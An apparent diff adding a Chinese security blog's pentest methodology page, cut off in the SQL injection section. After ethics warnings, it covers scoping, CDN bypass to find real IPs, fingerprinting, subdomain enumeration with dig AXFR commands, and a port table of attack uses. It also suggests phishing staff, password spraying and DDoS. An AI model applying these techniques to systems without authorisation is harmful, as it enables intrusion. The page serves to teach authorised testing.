@@ -1,0 +1,1035 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>渗透测试流程 - Pa55w0rd的博客</title>
+	<meta name="description" content="渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<link rel="apple-touch-icon" href="/assets/img/favicon/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicon/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicon/apple-touch-icon-114x114.png">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#2d2a2a">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#2d2a2a">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#2d2a2a">
+
+	<link href="https://fonts.googleapis.com/css?family=Finger+Paint|PT+Sans:400,700" rel="stylesheet">
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <aside class="sidebar">
+
+  <div class="sidebar-container">
+    <div class="sidebar-logo">
+      <a href="/" class="logo">Pa55w0rd</a>
+    </div>
+
+    <menu class="sidebar-menu">
+      <li class="menu-items"><a class="menu-links" href="/">主页</a></li>
+      <li class="menu-items"><a class="menu-links" href="/list/">目录</a></li>
+      <li class="menu-items"><a class="menu-links" href="/about/">关于我</a></li>
+      <li class="menu-items"><a class="menu-links" href="https://github.com/Pa55w0rd/">Github 项目</a></li>
+    </menu>
+
+    <div class="sidebar-social">
+ <!--     <li class="social-items"><a href="https://www.facebook.com/" class="social-links"><i class="social-icons fa fa-facebook" aria-hidden="true"></i></a></li>
+      <li class="social-items"><a href="https://twitter.com/" class="social-links"><i class="social-icons fa fa-twitter" aria-hidden="true"></i></a></li>
+      <li class="social-items"><a href="https://plus.google.com/" class="social-links"><i class="social-icons fa fa-google-plus" aria-hidden="true"></i></a></li>
+      <li class="social-items"><a href="https://github.com/https://github.com/Pa55w0rd" class="social-links"><i class="social-icons fa fa-github" aria-hidden="true"></i></a></li>
+-->
+		      <div>Copyright © 2018 www.pa55w0rd.club All Rights Reserved </div>
+	  <div>Email：pa55w0rd@aliyun.com </div>
+	</div>
+
+  </div>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-126660308-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-126660308-1');
+</script>
+
+</aside>
+
+
+  <main role="main">
+    <div class="content">
+      <article class="page-article">
+  <div class="wrap-content">
+    <header class="page-header">
+      <h1 class="page-title">渗透测试流程</h1>
+      <div class="page-date"><span>2018, Oct 19&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+    </header>
+    <div class="page-content">
+      
+      <blockquote>
+  <p><strong>总结，持续更新</strong></p>
+</blockquote>
+
+<blockquote>
+  <p><strong>白帽子要有自己的原则和底线，即使数据再诱人，也千万不要去拿任何数据!</strong></p>
+</blockquote>
+
+<blockquote>
+  <p><strong>是要在客户允许的范围内进行测试，白帽子需要有白帽子的底线！</strong></p>
+</blockquote>
+
+<blockquote>
+  <p><strong>常在河边走很容易就湿鞋，但如果你熟知法律边界，知道有一条不可触碰的高压线摆在那，你就可以做到常在河堤走，永远不湿鞋。-TK教主</strong></p>
+</blockquote>
+
+<ul id="markdown-toc">
+  <li><a href="#0x00-前言" id="markdown-toc-0x00-前言">0x00 前言</a></li>
+  <li><a href="#0x01-明确目标" id="markdown-toc-0x01-明确目标">0x01 明确目标</a></li>
+  <li><a href="#0x02-信息收集" id="markdown-toc-0x02-信息收集">0x02 信息收集</a></li>
+  <li><a href="#0x03-漏洞发现" id="markdown-toc-0x03-漏洞发现">0x03 漏洞发现</a></li>
+  <li><a href="#0x04-漏洞验证" id="markdown-toc-0x04-漏洞验证">0x04 漏洞验证</a></li>
+  <li><a href="#0x05-后渗透阶段" id="markdown-toc-0x05-后渗透阶段">0x05 后渗透阶段</a></li>
+  <li><a href="#0x06-报告编写" id="markdown-toc-0x06-报告编写">0x06 报告编写</a></li>
+  <li><a href="#0x07-风险规避" id="markdown-toc-0x07-风险规避">0x07 风险规避</a></li>
+</ul>
+
+<h2 id="0x00-前言">0x00 前言</h2>
+
+<p>渗透测试是指渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对某个特定网络进行测试，以期发现和挖掘系统中存在的漏洞，然后输出渗透测试报告，并提交给网络所有者。网络所有者根据渗透人员提供的渗透测试报告，可以清晰知晓系统中存在的安全隐患和问题。<br />
+渗透测试不同于入侵，入侵是不择手段的，甚至是居右破坏性的拿到系统权限</p>
+
+<h2 id="0x01-明确目标">0x01 明确目标</h2>
+
+<p>当拿到一个合法的渗透测试项目时，我们首先应该明确客户要求我们进行渗透测试的范围以及整体项目的时间。</p>
+
+<ul>
+  <li>确定范围：测试目标的范围，ip，域名，内外网。</li>
+  <li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权？哪些社工手段不能使用等。</li>
+  <li>确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等。（立体全方位）</li>
+</ul>
+
+<p>不会些什么长篇大论，都是CV的，现在在甲方，渗透尽量在不影响业务系统正常运行的前提下进行一次完整的测试，需要全面测试，不能只测出来几个漏洞应付了事了。当然，版本迭代/新业务线啥的一般都是在测试环境上做了，线上的主要看有没有配置问题（服务器/中间件等安全基线这块都没做）</p>
+
+<h2 id="0x02-信息收集">0x02 信息收集</h2>
+
+<p>在对一个站进行渗透测试的过程中，信息收集是非常重要的。信息收集的详细与否可能决定着此次渗透测试的结果，知己知彼，百战不殆。</p>
+
+<p>信息搜集分为主动信息搜集和被动信息搜集。</p>
+
+<p>主动信息搜集就是通过直接访问和扫描信息的方式进行收集信息，缺点是会记录自己的操作信息；被动信息搜集就是通过第三方服务进行信息搜集，缺点是收集信息有限。</p>
+
+<ul>
+  <li>
+    <p>真实IP查询</p>
+
+    <p>企业常常为了增强网页访问速度为服务加cdn，CDN的虚假IP干扰了我们的渗透测试，如何判断是否做了cdn<br />
+  可以通过<a href="http://ping.chinaz.com/">站长工具多个地点ping服务器</a>，或使用nslookup进行检测，如果做了cdn的话会返回多个IP地址<br />
+  验证ip和域名是否真实对应，修改本地hosts文件，强行将域名与ip解析对应，然后访问域名，查看页面是否变化<br />
+  如何绕过cdn查询真实IP的一些方法：<br /></p>
+    <ol>
+      <li><strong>ping顶级域名或子域名</strong>，一般企业都只会对www域名做cdn，而常常忽略了空域名和子域名,确定了没有使用CDN的二级域名后，本地将目标域名绑定到同ip，能访问就说明目标站与二级域名在同一服务器，也可能在同C段，扫描C段所有开80端口的ip，挨个尝试</li>
+      <li><strong>查询历史dns记录</strong>,如果存在做了cdn之前的历史记录也是可以查到真实ip的，相关查询网站有：
+        <div class="highlighter-rouge"><pre class="highlight"><code> https://dnsdb.io/zh-cn/
+ https://x.threatbook.cn/
+ http://toolbar.netcraft.com/site_report?url=
+ http://viewdns.info/
+ http://whoisrequest.com/history/
+</code></pre>
+        </div>
+      </li>
+      <li>DNS社工库 <em>Ps.和查询历史dns记录道理一样，没有相关的裤子</em></li>
+      <li>还可以使用对方的邮件服务（如注册激活邮件、找回密码），站点的sendmail功能或者是rss订阅服务，当目标给你发送了一条消息也可以从消息中找到真实ip</li>
+      <li>利用国外的vps去ping一下域名，大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率直接解析到真实IP。</li>
+      <li>网站的各种探针类文件，如phpinfo里面的<code class="highlighter-rouge">_SERVER["SERVER_ADDR"]</code>也包含的有服务器端的真实ip，当然这个情况还是比较少的，因为一般都会把phpinfo给删除</li>
+      <li>如果目标网站有自己的app或软件产品,抓下它的请求,看看能不能这里面找到目标的真实ip</li>
+      <li>通过各种漏洞或其他方式想办法让目标反向连接我们，比如命令执行反弹shell、ssrf漏洞、xss盲打后台，被动和目标数据库建立连接等等</li>
+      <li>使用<code class="highlighter-rouge">nslookup</code>或<code class="highlighter-rouge">dig</code>更改dns为国外的不知名的dns服务器来解析目标域名的各种记录（ns、a、mx等）可能查到其真实ip
+        <div class="highlighter-rouge"><pre class="highlight"><code> 收集的部分国外dns服务器
+ 209.244.0.3
+ 64.6.64.6
+ 8.8.8.8
+ 9.9.9.9
+ 8.26.56.26
+ 199.85.126.10
+ 208.67.222.222
+ 195.46.39.39
+ 69.195.152.204
+ 208.76.50.50
+ 216.146.35.35
+ 37.235.1.174
+ 198.101.242.72
+ 77.88.8.8
+ 91.239.100.100
+ 74.82.42.42
+ 109.69.8.51
+ 156.154.70.1
+ 1.1.1.1
+ 45.77.165.194
+</code></pre>
+        </div>
+      </li>
+      <li>让服务器去访问你的vps，比如说这个网址有设置头像的方式，并且可以直接填写头像的url，或者插入远程图片，那么我们可以把图片放在自己vps上提交给服务器，那么也可以从日志中得到真实ip</li>
+      <li>DDOS，耗尽CDN流量，回源之后找到真实ip。不设防的cdn量大就会挂，高防CDN要增大流量 <em>Ps.没有资源，现在防ddos也比较强，没尝试过</em></li>
+      <li>社工手段，拿到目标网站管理员在cdn的账号，从配置中找到网站的真实IP地址   <em>Ps.沟通障碍</em></li>
+      <li>全网扫描zmap，使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host字段匹配相关域名 <em>Ps.因造成网络拥堵，后续没有尝试</em></li>
+      <li>通过shadan/zoomeye/fofa搜索网站特殊标题、内容、网站源码</li>
+      <li>cloudflare，如<a href="https://github.com/m0rtem/CloudFail">CloudFail</a>、<a href="http://www.freebuf.com/articles/web/41533.html">CloudFlare防护下的破绽：寻找真实IP的几条途径</a>、<a href="http://crimeflare.net:83/cfssl.html">http://crimeflare.net:83/cfssl.html(需要翻墙)</a></li>
+    </ol>
+  </li>
+  <li>
+    <p>whois信息查询</p>
+
+    <p>当拿到一个域名的时候，我们首先应该进行whois查询，可以使kali 下面的 whois命令或者使用<a href="http://whois.chinaz.com/">chinaz在线工具</a>，whois信息可以获取关键注册人的信息，包括注册公司、注册邮箱、管理员邮箱、管理员联系手机等,对后期社工很有用，还可以查询同一注册人注册的其他的域名，域名对应的NS记录、MX记录，自动识别国内常见的托管商（万网、新网等）。或者我们可以有针对性的利用其信息生成字典，对后台或者其他登录功能进行爆破。</p>
+  </li>
+  <li>
+    <p>利用搜索引擎发现和侦察信息泄露，如google hacking获得后台，未授权页面，敏感url等</p>
+
+    <p>利用google去搜索包括特殊文本字符串的网页
+  inurl:xxx filetype:xls
+  inurl:xxx site:xxx.com</p>
+  </li>
+  <li>
+    <p>旁站C段查询</p>
+
+    <p>旁站是和目标网站在同一台服务器上的其它的网站；如果从目标站本身找不到好的入手点，这时候，如果想快速拿下目标的话，一般都会先找个目标站点所在服务器上其他的比较好搞的站下手，然后再想办法跨到真正目标的站点目录中。C段是和目标机器ip处在同一个C段的其它机器；通过目标所在C段的其他任一台机器，想办法跨到我们的目标机器上。常用的工具有<a href="http://www.cnblogs.com/dongchi/p/4155368.html">ip反查</a>，Nmap，Zenmap。</p>
+  </li>
+  <li>
+    <p>指纹识别</p>
+
+    <p>通过指纹识别，我们可以明确这个网站服务器是用什么操作系统（win/linux）<br />
+  针对一个web服务，我们应该首先明确这个是由什么语言开发的前后端，使用的什么webserver版本和类型，因为不同的webserver也有不同的解析漏洞或者其他的漏洞。<br /></p>
+    <ul>
+      <li>使用浏览器插件(wappalyzer)可以很方便的查看这些信息<br /></li>
+      <li>使用nc 或telnet 可以观察数据包特征或者网页加载的特殊文件来识别cms，如<code class="highlighter-rouge">nc xxx.com 80</code></li>
+      <li>通过Zoomeye、Shodan等在线系统搜集</li>
+      <li>利用Nmap(<code class="highlighter-rouge">namp -sT -Pn -v &lt;IP&gt;</code>)、MSF、Zmap等端口和指纹识别功能搜集</li>
+      <li>使用burpsuite、Niketo、Whatweb、在线cms指纹识别工具等
+        <ul>
+          <li>HTTP 标头 ，如 X-Powered-By 字段</li>
+          <li>cookie</li>
+          <li>HTML 源代码</li>
+          <li>特定文件和文件夹，例如/templets/default/style/dedecms.css — dedecms</li>
+          <li>网站独有文件的md5，例如favicon.ico</li>
+          <li>网站命名规则；返回头的关键字；网页关键字；URL特征；Meta特征；Script特征；robots.txt；网站路径特征；网站静态资源；爬取网站目录信息等
+  是否用了某种开源程序cms，然后我们可以利用公开的对应版本的poc进行测试，当然我们也可以将对应版本的源码下载下来进行代码审计。<br />
+  用什么框架开发的，如Thinkphp、struts2</li>
+        </ul>
+      </li>
+    </ul>
+
+    <p>是否使用负载均衡，负载均衡是通过在多个服务器中分割WEB流量，来确保单个服务器的请求不会超载，一般不可见，但是有可能极大的改变渗透测试的进程。当发出请求的时候，负载均衡可能将请求交给其中的一个服务器来处理。每个服务器的应用结构虽然相同，但是文件夹不同、补丁级别不同及其他配置可能完全不同</p>
+    <ul>
+      <li>使用kali下的lbd工具识别</li>
+      <li><a href="https://github.com//jmbr/halberd">halberd</a></li>
+      <li>msf下 <code class="highlighter-rouge">auxiliary/gather/f5_bigip_cookie_disclosure</code> 模块</li>
+      <li>对临近IP段进行扫描</li>
+      <li>响应时间戳分析：有些服务器没有同步时间，就可以在一秒发出多个请求确定是否有多台服务器</li>
+      <li>通过比较相同请求资源的首部响应中的ETag和Last-Modified的值，能够确定是否会从多个服务器上的到不同的文件</li>
+      <li>通过查找cookie：有些服务器会在HTTP会话中加入自己的cookie来指定负载回话</li>
+      <li>枚举SSL异常：查看SSL证书是否存在差异，是否支持同一个密码长度</li>
+      <li>检查HTML源码中返回的注释</li>
+    </ul>
+
+    <p>是否存在防护设备</p>
+    <ul>
+      <li>有没有waf，具体是什么类型waf，可以在目标url的动态参数输入一些敏感特征，看是否拦截，也可以用工具判断whatwaf、wafw00f，熟悉各种bypasswaf的骚姿势</li>
+      <li>服务器防火墙是否开放，一般都会禁止icmp，通过ping命令探测</li>
+    </ul>
+  </li>
+  <li>
+    <p>历史漏洞收集</p>
+
+    <p>了解目标历史漏洞对我们帮助也是非常的大，至少我们可以知道网站设计人员喜欢在什么地方犯错误，喜欢犯什么类型的错误。这样我们可以有针对性的进行渗透测试，或者说我们可以查看是否已经修补过得漏洞是否能够绕过。exploitdb 、hackerone、CNVD 、乌云漏洞库镜像站。</p>
+  </li>
+  <li>
+    <p>利用app进行信息收集</p>
+
+    <p>可以利用工具对其进行逆向，找出其所使用的url链接，然后进行专门的渗透测试</p>
+  </li>
+  <li>
+    <p>敏感目录/文件</p>
+
+    <p>敏感目录包括但不限于网站的敏感文件（.mdb,.excel,.word,.zip,.rar），各类web入口（后台、控制台弱口令、爆破）、未授权访问的上传页面，文本编辑器、robots.txt、.git文件泄露，.svn文件泄露，.DB_store文件泄露，WEB-INF/web.xml泄露或者phpmyadmin等等目录。<br />就拿备份文件来讲，一般人拿到以后只会查看是否有数据库账号密码进行连接，如果没有就无从下手,其实我们可以通过代码审计发现它的漏洞进行渗透测试。再比如phpmyadmin，我们可以使用爆破工具对其账号密码进行爆破。或者是之前有黑阔留下的后门文件，我们也可以爆破其密码进行利用。<br />目录扫描有两种方式，使用目录字典进行暴力才接存在该目录或文件返回200或者403；使用爬虫爬行主页上的所有链接，对每个链接进行再次爬行，收集这个域名下的所有链接，然后总结出需要的信息。常用工具<a href="https://github.com/maurosoria/dirsearch">dirsearch</a>、御剑、wwwscan等</p>
+  </li>
+  <li>
+    <p>端口信息</p>
+
+    <p>服务和安全是相对应的，每开启一个端口，那么攻击面就大了一点，开启的端口越多，也就意味着服务器面临的威胁越大，如服务配置错误、服务自身漏洞利用、弱口令等。当拿到一个ip的时候，我们一般都需要使用nmap或者其他同类扫描工具如masscan对其开放端口以及端口对应的服务和版本信息进行扫描。通过端口开放情况，我们可以针对性的对其进行渗透测试</p>
+
+    <table>
+      <thead>
+        <tr>
+          <th>端口号</th>
+          <th>端口服务/协议简要说明</th>
+          <th>关于端口可能的一些渗透用途</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>tcp 20,21</td>
+          <td>ftp 默认的数据和命令传输端口[可明文亦可加密传输]</td>
+          <td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td>
+        </tr>
+        <tr>
+          <td>tcp 22</td>
+          <td>ssh[数据ssl加密传输]</td>
+          <td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…</td>
+        </tr>
+        <tr>
+          <td>tcp 23</td>
+          <td>telnet[明文传输]</td>
+          <td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获</td>
+        </tr>
+        <tr>
+          <td>tcp 25</td>
+          <td>smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]</td>
+          <td>邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
+        </tr>
+        <tr>
+          <td>tcp/udp 53</td>
+          <td>dns[域名解析]</td>
+          <td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
+        </tr>
+        <tr>
+          <td>tcp/udp 69</td>
+          <td>tftp[简单文件传输协议,无认证]</td>
+          <td>尝试下载目标及其的各类重要配置文件</td>
+        </tr>
+        <tr>
+          <td>tcp 80-89,443,8440-8450,8080-8089</td>
+          <td>web[各种常用的web服务端口]</td>
+          <td>各种常用web服务端口,可尝试经典的top n,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……</td>
+        </tr>
+        <tr>
+          <td>tcp 110</td>
+          <td>[邮局协议,可明文可密文]</td>
+          <td>可尝试爆破,嗅探</td>
+        </tr>
+        <tr>
+          <td>tcp 137,139,445</td>
+          <td>samba[smb实现windows和linux间文件共享,明文]</td>
+          <td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
+        </tr>
+        <tr>
+          <td>tcp 143</td>
+          <td>imap[可明文可密文]</td>
+          <td>可尝试爆破</td>
+        </tr>
+        <tr>
+          <td>udp 161</td>
+          <td>snmp[明文]</td>
+          <td>爆破默认团队字符串,搜集目标内网信息</td>
+        </tr>
+        <tr>
+          <td>tcp 389</td>
+          <td>ldap[轻量级目录访问协议]</td>
+          <td>ldap注入,允许匿名访问,弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 512,513,514</td>
+          <td>linux rexec</td>
+          <td>可爆破,rlogin登陆</td>
+        </tr>
+        <tr>
+          <td>tcp 873</td>
+          <td>rsync备份服务</td>
+          <td>匿名访问,文件上传</td>
+        </tr>
+        <tr>
+          <td>tcp 1194</td>
+          <td>openvpn</td>
+          <td>想办法钓vpn账号,进内网</td>
+        </tr>
+        <tr>
+          <td>tcp 1352</td>
+          <td>Lotus domino邮件服务</td>
+          <td>弱口令,信息泄漏,爆破</td>
+        </tr>
+        <tr>
+          <td>tcp 1433</td>
+          <td>mssql数据库</td>
+          <td>注入,提权,sa弱口令,爆破</td>
+        </tr>
+        <tr>
+          <td>tcp 1521</td>
+          <td>oracle数据库</td>
+          <td>tns爆破,注入,弹shell…</td>
+        </tr>
+        <tr>
+          <td>tcp 1500</td>
+          <td>ispmanager主机控制面板</td>
+          <td>弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 1025,111,2049</td>
+          <td>nfs</td>
+          <td>权限配置不当</td>
+        </tr>
+        <tr>
+          <td>tcp 1723</td>
+          <td>pptp</td>
+          <td>爆破,想办法钓vpn账号,进内网</td>
+        </tr>
+        <tr>
+          <td>tcp 2082,2083</td>
+          <td>cpanel主机管理面板登录</td>
+          <td>弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 2181</td>
+          <td>zookeeper</td>
+          <td>未授权访问</td>
+        </tr>
+        <tr>
+          <td>tcp 2601,2604</td>
+          <td>zebra路由</td>
+          <td>默认密码zerbra</td>
+        </tr>
+        <tr>
+          <td>tcp 3128</td>
+          <td>squid代理服务</td>
+          <td>弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 3312,3311</td>
+          <td>kangle主机管理登录</td>
+          <td>弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 3306</td>
+          <td>mysql数据库</td>
+          <td>注入,提权,爆破</td>
+        </tr>
+        <tr>
+          <td>tcp 3389</td>
+          <td>windows rdp远程桌面</td>
+          <td>shift后门[需要03以下的系统],爆破,ms12-020[蓝屏exp]</td>
+        </tr>
+        <tr>
+          <td>tcp 4848</td>
+          <td>glassfish控制台</td>
+          <td>弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 4899</td>
+          <td>radmin远程桌面管理工具,现在已经非常非常少了</td>
+          <td>抓密码拓展机器</td>
+        </tr>
+        <tr>
+          <td>tcp 5000</td>
+          <td>sybase/DB2数据库</td>
+          <td>爆破,注入</td>
+        </tr>
+        <tr>
+          <td>tcp 5432</td>
+          <td>postgresql数据库</td>
+          <td>爆破,注入,弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 5632</td>
+          <td>pcanywhere远程桌面管理工具</td>
+          <td>抓密码,代码执行,已经快退出历史舞台了</td>
+        </tr>
+        <tr>
+          <td>tcp 5900,5901,5902</td>
+          <td>vnc远程桌面管理工具</td>
+          <td>弱口令爆破,如果信息搜集不到位,成功几率很小</td>
+        </tr>
+        <tr>
+          <td>tcp 5984</td>
+          <td>CouchDB</td>
+          <td>未授权导致的任意指令执行</td>
+        </tr>
+        <tr>
+          <td>tcp 6379</td>
+          <td>redis未授权</td>
+          <td>可尝试未授权访问,弱口令爆破</td>
+        </tr>
+        <tr>
+          <td>tcp 7001,7002</td>
+          <td>weblogic控制台</td>
+          <td>java反序列化,弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 7778</td>
+          <td>kloxo</td>
+          <td>主机面板登录</td>
+        </tr>
+        <tr>
+          <td>tcp 8000</td>
+          <td>Ajenti主机控制面板</td>
+          <td>弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 8443</td>
+          <td>plesk主机控制面板</td>
+          <td>弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 8069</td>
+          <td>zabbix</td>
+          <td>远程执行,sql注入</td>
+        </tr>
+        <tr>
+          <td>tcp 8080-8089</td>
+          <td>Jenkins,jboss</td>
+          <td>反序列化,控制台弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 9080-9081,9090</td>
+          <td>websphere控制台</td>
+          <td>java反序列化/弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 9200,9300</td>
+          <td>elasticsearch</td>
+          <td>远程执行</td>
+        </tr>
+        <tr>
+          <td>tcp 10000</td>
+          <td>webmin linux主机web控制面板入口</td>
+          <td>弱口令</td>
+        </tr>
+        <tr>
+          <td>tcp 11211</td>
+          <td>memcached</td>
+          <td>未授权访问</td>
+        </tr>
+        <tr>
+          <td>tcp 27017,27018</td>
+          <td>mongodb</td>
+          <td>爆破,未授权访问</td>
+        </tr>
+        <tr>
+          <td>tcp 3690</td>
+          <td>svn服务</td>
+          <td>svn泄露,未授权访问</td>
+        </tr>
+        <tr>
+          <td>tcp 50000</td>
+          <td>SAP Management Console</td>
+          <td>远程执行</td>
+        </tr>
+        <tr>
+          <td>tcp 50070,50030</td>
+          <td>hadoop</td>
+          <td>默认端口未授权访问</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <p>子域名信息收集</p>
+
+    <p>在渗透测试的时候，往往主站的防御会很强，常常无从下手，那么子站就是一个重要的突破口，因为一个企业可能对子域名的安全不是很重视，甚至有些子域名只是内测阶段还没有上线，因此子域名是渗透测试的主要关注对象，子域名搜集的越完整，那么挖到的漏洞就可能更多，甚至漏洞的级别也会更高。常用工具暴力枚举<a href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a>、子域名挖掘机Layer、DNS域传送漏洞、https证书日志、DNS解析记录、搜索引擎（baidu/google）、IP反查、主站爬取、shodan/fofa/zoomeye等</p>
+
+    <p><strong>利用dig检查目标ns服务器是否允许传送</strong></p>
+
+    <p>区域传送：允许第三主服务器的数据刷新自己的区域数据库，防止主域名服务器因意外故障变得不可用时影响到这个网络。 区域传送配置错误：只要有人发出请求，就会提供一个区域数据库的拷贝，把内部主机名和ip地址暴露出来</p>
+
+    <p>首先,应该去查下目标的ns服务器是否允许区域传送,如果允许,直接把目标的整个子域备份过来即可，可以使用 <strong>dig</strong>（可以从该域名的官方DNS服务器上查询到精确的权威解答）或 <strong>nslookup</strong>（得到DNS解析服务器保存在Cache中的非权威解答）</p>
+    <ul>
+      <li>查出目标自己所有的ns记录,然后挨个尝试目标ns服务器是否允许传送（务必是目标自己的ns服务器,第三方的不算）
+        <div class="highlighter-rouge"><pre class="highlight"><code>  # dig +short @8.8.8.8 xx.cn ns
+  dns.xx.cn.
+  dns1.xx.cn.
+</code></pre>
+        </div>
+        <p>通过上面的查询,我们确定了目标自己的三个ns服务器,下面就开始来尝试逐个传送,这里还是要注意,必须用目标自己的ns服务器来解析它自己的子域</p>
+      </li>
+    </ul>
+
+    <div class="highlighter-rouge"><pre class="highlight"><code>  # dig @dns.xx.cn xx.cn axfr
+
+  ; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.1-Ubuntu &lt;&lt;&gt;&gt; @dns.xx.cn xx.cn axfr
+  ; (1 server found)
+  ;; global options: +cmd
+  ; Transfer failed.
+
+  # dig @dns1.xx.cn xx.cn axfr
+
+  ; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.1-Ubuntu &lt;&lt;&gt;&gt; @dns1.xx.cn xx.cn axfr
+  ; (1 server found)
+  ;; global options: +cmd
+  ; Transfer failed.
+</code></pre>
+    </div>
+
+    <p>很显然,上面的这些ns服务器都不允许传送,如果目标ns服务器实在不允许传送,从其他的各种记录中获取子域,如,mx记录,spf记录,srv记录…</p>
+  </li>
+  <li>
+    <p>邮件系统信息</p>
+
+    <p>通过域名MX记录查看是否为自建邮件服务器，自建的情况下可以后续测试漏洞，通过TheHarvester可以进行邮箱挖掘，没有找到漏洞也可以进行钓鱼</p>
+  </li>
+  <li>
+    <p>了解网站业务功能</p>
+
+    <p>我们需要对整个站点的整体功能有所了解，从注册用户到更改信息更改密码等等，所有的功能都需要尽可能体验一遍，在体验的同时就应该思考这个功能可能产生什么样的漏洞。并且需要多注册几个账号，这对后面的csrf漏洞发现或者逻辑漏洞发现等等都很有帮助</p>
+  </li>
+  <li>
+    <p>了解网站结构</p>
+
+    <p>在开始安全测试之前, 了解应用程序的结构是至关重要的。如果不彻底了解应用程序的布局, 就不可能对其进行彻底的测试。可以通过burpsuite自动化爬虫</p>
+  </li>
+  <li>
+    <p>企业及员工信息收集</p>
+
+    <p>通过天眼查、官方网站等可以查到企业的一些基本信息</p>
+
+    <p>拿到员工的信息，我们可以尝试使用弱密码进行登录一些内部平台，并且一些员工的邮箱的前缀很可能就是他的密码。当然，如果说当一个服务不允许多次使用错误密码登录，我们可以先确定弱口令，然后爆破收集到的账号信息去爆破哪些用户使用这个弱口令从而绕过这个防护机制。</p>
+
+    <p>可以尝试给对方邮箱发送钓鱼邮件或木马</p>
+
+    <p>水坑攻击或鱼叉式钓鱼</p>
+  </li>
+  <li>
+    <p>网站备案信息</p>
+
+    <p>www.beianbeian.com/?jdfwkey=vv0kk</p>
+
+    <p>http://www.miitbeian.gov.cn/publish/query/indexFirst.action</p>
+  </li>
+  <li>
+    <p>F12审查网页元素</p>
+
+    <p>对于程序员来说, 在源代码中添加详细注释和元数据是非常普遍的,甚至是推荐的。但是, HTML 代码中包含的注释和元数据可能会对潜在攻击者暴露内部信息。应对源代码中的注释和元数据进行审查以确定是否泄露了任何信息。</p>
+  </li>
+</ul>
+
+<p>根据已搜集的信息进行梳理与分析，查找疏漏点进行搜集补充，从各个角度都整理一套渗透攻击步骤与思路的规划，优先以最擅长和最有把握的方面切入</p>
+
+<h2 id="0x03-漏洞发现">0x03 漏洞发现</h2>
+
+<ul>
+  <li>
+    <p>漏洞扫描</p>
+
+    <p>关于漏洞扫描的工具太多了，一般使用awvs/newwus扫描，其他辅助工具 Nmap、msf、searchsploit(exlpoitdb)、burp、firefox插件等</p>
+
+    <p>但是不要依赖工具，很多漏洞工具都是扫不出的，一定要结合手工测试漏洞，需要靠平时的积累学习，且扫描器扫描会插入很多脏数据对网站数据和服务造成破坏。</p>
+
+    <p>拿到环境和测试账号后，先熟悉一下网站的基本功能和结构，注册/登陆/各个功能模块，从系统漏洞/中间件漏洞/web漏洞</p>
+  </li>
+  <li>
+    <p>sql注入</p>
+
+    <p><strong>定义</strong>：Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，黑客可以利用该漏洞执行任意SQL语句。<br />
+  掌握常用的sql注入手法，熟练使用sqlmap或者同类工具。还需要学会剑走偏锋，多去探索冷门的sql注入方法，这样才不会被过滤了某些字符的时候而束手无策。<br />
